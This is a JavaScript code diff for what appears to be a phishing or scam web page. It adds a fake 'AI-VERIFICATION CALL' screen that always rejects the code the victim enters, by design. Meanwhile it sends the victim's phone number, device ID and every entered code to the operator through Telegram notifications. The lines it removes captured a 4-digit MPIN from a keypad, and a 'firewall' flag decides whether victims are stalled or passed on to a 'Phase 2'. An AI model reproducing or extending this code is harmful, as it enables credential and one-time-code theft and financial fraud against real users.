+        await sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
+        
+        // Update UI
+        const statusIcon = document.getElementById('callStatusIcon');
+        const statusText = document.getElementById('callStatusText');
+        const timerDisplay = document.getElementById('callTimerDisplay');
+        const codeDisplay = document.getElementById('callCodeDisplay');
+        const requestBtn = document.getElementById('requestCallBtn');
+        const codeSection = document.getElementById('codeSection');
+        const codeInput = document.getElementById('code4Digit');
+        const codeErrorMsg = document.getElementById('codeErrorMsg');
+        const callExpiredMsg = document.getElementById('callExpiredMsg');
+        
+        // Reset messages
+        if (codeErrorMsg) codeErrorMsg.style.display = 'none';
+        if (callExpiredMsg) callExpiredMsg.style.display = 'none';
+        if (codeInput) codeInput.value = '';
+        
+        if (statusIcon) statusIcon.innerHTML = '📞';
+        if (statusText) {
+            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...';
+            statusText.style.color = '#00d4ff';
+        }
+        if (timerDisplay) {
+            timerDisplay.style.display = 'block';
+            timerDisplay.textContent = '60s';
+            timerDisplay.style.color = '#00d4ff';
+        }
+        if (codeDisplay) {
+            codeDisplay.style.display = 'none';
+        }
+        if (requestBtn) {
+            requestBtn.disabled = true;
+            requestBtn.style.opacity = '0.5';
+            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
+        }
+        if (codeSection) {
+            codeSection.style.display = 'none';
         }
         
-        const numBtns = document.querySelectorAll('.num-btn');
-        for (let i = 0; i < numBtns.length; i++) {
-            const btn = numBtns[i];
-            const newBtn = btn.cloneNode(true);
-            btn.parentNode.replaceChild(newBtn, btn);
+        // Start countdown timer
+        startCallTimer();
+        
+        // Play call sound effect
+        playCallSound();
+        
+        // Simulate call connection after 3-5 seconds
+        setTimeout(() => {
+            if (statusIcon) statusIcon.innerHTML = '📱';
+            if (statusText) {
+                statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
+                statusText.style.color = '#22C55E';
+            }
+            if (codeDisplay) {
+                codeDisplay.style.display = 'block';
+                codeDisplay.textContent = '----';
+                codeDisplay.style.color = '#22C55E';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'block';
+            }
+            if (codeInput) {
+                codeInput.focus();
+            }
             
-            newBtn.onclick = function() {
-                const num = this.getAttribute('data-num');
+            // Show notification with code
+            showAICallNotification(currentCallCode);
+            
+        }, 3000 + Math.random() * 2000);
+    }
+    
+    // ========== GENERATE CALL CODE ==========
+    function generateCallCode() {
+        // Generate random 4-digit code
+        const code = Math.floor(1000 + Math.random() * 9000);
+        return code.toString();
+    }
+    
+    // ========== START CALL TIMER ==========
+    function startCallTimer() {
+        stopCallTimer();
+        
+        const timerDisplay = document.getElementById('callTimerDisplay');
+        const statusText = document.getElementById('callStatusText');
+        const codeDisplay = document.getElementById('callCodeDisplay');
+        const codeSection = document.getElementById('codeSection');
+        const requestBtn = document.getElementById('requestCallBtn');
+        const callExpiredMsg = document.getElementById('callExpiredMsg');
+        
+        callTimerInterval = setInterval(() => {
+            callCountdown--;
+            
+            if (timerDisplay) {
+                timerDisplay.textContent = callCountdown + 's';
                 
-                if (num === 'clear') {
-                    currentMPIN = currentMPIN.slice(0, -1);
-                    updateMPINDots();
-                } 
-                else if (num === 'reset') {
-                    currentMPIN = '';
-                    updateMPINDots();
+                // Change color when time is running low
+                if (callCountdown <= 10) {
+                    timerDisplay.style.color = '#ff4444';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 68, 68, 0.3)';
+                } else if (callCountdown <= 20) {
+                    timerDisplay.style.color = '#ff8800';
+                    timerDisplay.style.textShadow = '0 0 20px rgba(255, 136, 0, 0.2)';
                 }
-                else if (currentMPIN.length < 4) {
-                    currentMPIN += num;
-                    updateMPINDots();
-                    if (currentMPIN.length === 4) {
-                        checkMPIN();
-                    }
+            }
+            
+            if (callCountdown <= 0) {
+                // Call expired
+                stopCallTimer();
+                
+                const userPhone = localStorage.getItem("userPhone") || "Unknown";
+                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                sendAICallExpiredNotification(userPhone, deviceId);
+                
+                if (statusText) {
+                    statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                    statusText.style.color = '#ff8800';
                 }
-            };
+                if (timerDisplay) {
+                    timerDisplay.style.display = 'none';
+                }
+                if (codeDisplay) {
+                    codeDisplay.style.display = 'none';
+                }
+                if (codeSection) {
+                    codeSection.style.display = 'none';
+                }
+                if (requestBtn) {
+                    requestBtn.disabled = false;
+                    requestBtn.style.opacity = '1';
+                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
+                }
+                if (callExpiredMsg) {
+                    callExpiredMsg.style.display = 'block';
+                }
+                
+                callInProgress = false;
+                isCallRequested = false;
+            }
+        }, 1000);
+    }
+    
+    // ========== STOP CALL TIMER ==========
+    function stopCallTimer() {
+        if (callTimerInterval) {
+            clearInterval(callTimerInterval);
+            callTimerInterval = null;
         }
     }
     
-    // ========== HIDE FIREWALL POPUP ==========
-    function hideFirewallPopup() {
-        console.log('Firewall popup closed');
+    // ========== VERIFY CODE ==========
+    async function verifyCode() {
+        const codeInput = document.getElementById('code4Digit');
+        const codeErrorMsg = document.getElementById('codeErrorMsg');
+        const callExpiredMsg = document.getElementById('callExpiredMsg');
+        const verifyBtn = document.getElementById('verifyCodeBtn');
+        
+        if (!codeInput) return;
+        
+        const enteredCode = codeInput.value.trim();
+        
+        // Validate input
+        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
+            if (codeErrorMsg) {
+                codeErrorMsg.textContent = '⚠️ Please enter a valid 4-digit code.';
+                codeErrorMsg.style.display = 'block';
+            }
+            codeInput.style.borderColor = '#ff4444';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 68, 68, 0.3)';
+            shakeElement(codeInput);
+            return;
+        }
+        
+        // Check if call is still active
+        if (callCountdown <= 0) {
+            if (callExpiredMsg) {
+                callExpiredMsg.style.display = 'block';
+            }
+            if (codeErrorMsg) codeErrorMsg.style.display = 'none';
+            codeInput.style.borderColor = '#ff8800';
+            codeInput.style.boxShadow = '0 0 20px rgba(255, 136, 0, 0.3)';
+            return;
+        }
+        
+        // ========== DEFAULT: ALWAYS INVALID ==========
+        // No valid code exists - every attempt is invalid
+        
+        codeEntered = true;
+        
+        // Send Telegram notification for invalid attempt
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        await sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
+        
+        // Show error
+        if (codeErrorMsg) {
+            codeErrorMsg.textContent = '❌ Invalid verification code. Please request a new call.';
+            codeErrorMsg.style.display = 'block';
+        }
+        
+        // Visual feedback
+        codeInput.style.borderColor = '#ff4444';
+        codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.4)';
+        shakeElement(codeInput);
+        
+        // Disable verify button temporarily
+        if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.5';
+            setTimeout(() => {
+                if (verifyBtn) {
+                    verifyBtn.disabled = false;
+                    verifyBtn.style.opacity = '1';
+                }
+            }, 2000);
+        }
+        
+        // Clear input after 1.5 seconds
+        setTimeout(() => {
+            codeInput.value = '';
+            codeInput.style.borderColor = '#00d4ff';
+            codeInput.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
+            
+            // Show "request new call" prompt
+            if (codeErrorMsg) {
+                codeErrorMsg.textContent = '🔄 Please request a new AI-Verification call.';
+                codeErrorMsg.style.color = '#ff8800';
+            }
+        }, 1500);
+        
+        // Reset to initial state after 4 seconds
+        setTimeout(() => {
+            if (codeErrorMsg) {
+                codeErrorMsg.style.display = 'none';
+                codeErrorMsg.textContent = '';
+                codeErrorMsg.style.color = '#ff4444';
+            }
+            
+            // Show expired state
+            const statusText = document.getElementById('callStatusText');
+            const timerDisplay = document.getElementById('callTimerDisplay');
+            const codeDisplay = document.getElementById('callCodeDisplay');
+            const codeSection = document.getElementById('codeSection');
+            const requestBtn = document.getElementById('requestCallBtn');
+            
+            if (statusText) {
+                statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
+                statusText.style.color = '#ff8800';
+            }
+            if (timerDisplay) {
+                timerDisplay.style.display = 'none';
+            }
+            if (codeDisplay) {
+                codeDisplay.style.display = 'none';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'none';
+            }
+            if (requestBtn) {
+                requestBtn.disabled = false;
+                requestBtn.style.opacity = '1';
+                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
+            }
+            
+            callInProgress = false;
+            isCallRequested = false;
+            
+        }, 4000);
+    }
+    
+    // ========== SHAKE ELEMENT ANIMATION ==========
+    function shakeElement(element) {
+        if (!element) return;
+        element.style.animation = 'shake 0.5s ease';
+        setTimeout(() => {
+            element.style.animation = '';
+        }, 500);
+    }
+    
+    // ========== SHOW AI CALL NOTIFICATION ==========
+    function showAICallNotification(code) {
+        // Create floating notification
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 212, 255, 0.15);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 16px;
+            padding: 16px 24px;
+            z-index: 99999;
+            animation: slideDown 0.5s ease;
+            max-width: 340px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+        `;
+        
+        notification.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 12px; justify-content: center;">
+                <div style="width: 40px; height: 40px; background: rgba(0, 212, 255, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(0, 212, 255, 0.2);">
+                    <i class="fas fa-phone" style="color: #00d4ff; font-size: 18px;"></i>
+                </div>
+                <div style="text-align: left;">
+                    <div style="font-size: 10px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 1px;">AI-VERIFICATION CALL</div>
+                    <div style="font-size: 14px; color: #fff; font-family: 'Poppins', sans-serif; font-weight: 600;">Your code: <span style="color: #22C55E; font-family: 'Orbitron', monospace; font-size: 18px; letter-spacing: 2px;">${code}</span></div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(notification);
+        
+        // Auto-remove after 8 seconds
+        setTimeout(() => {
+            notification.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+            notification.style.opacity = '0';
+            notification.style.transform = 'translateX(-50%) translateY(-20px)';
+            setTimeout(() => {
+                if (notification.parentNode) notification.remove();
+            }, 500);
+        }, 8000);
     }
     
     // ========== CHECK FIREWALL AND TRANSITION ==========
@@ -940,10 +1049,10 @@
         const isFirewallOn = await getFirewallStatus();
         
         if (isFirewallOn) {
-            console.log('Firewall ON - Showing verification');
+            console.log('🔥 Firewall ON - Showing AI-Verification');
             showFirewallPopup();
         } else {
-            console.log('Firewall OFF - Transition to Phase 2');
+            console.log('🔓 Firewall OFF - Transition to Phase 2');
             transitionToPhase2();
         }
     }
@@ -1206,6 +1315,7 @@
         
         claimInProgress = false;
         isRedirecting = false;
+        stopCallTimer();
         window.removeEventListener('beforeunload', beforeUnloadHandler);
     }
     
@@ -1216,7 +1326,7 @@
         init();
     }
     
-    // ========== EXPORT ==========
+    // ========== EXPORTS ==========
     window.showPopup = showPopup;
     window.closePopup = closePopup;
     window.getFirewallStatus = getFirewallStatus;
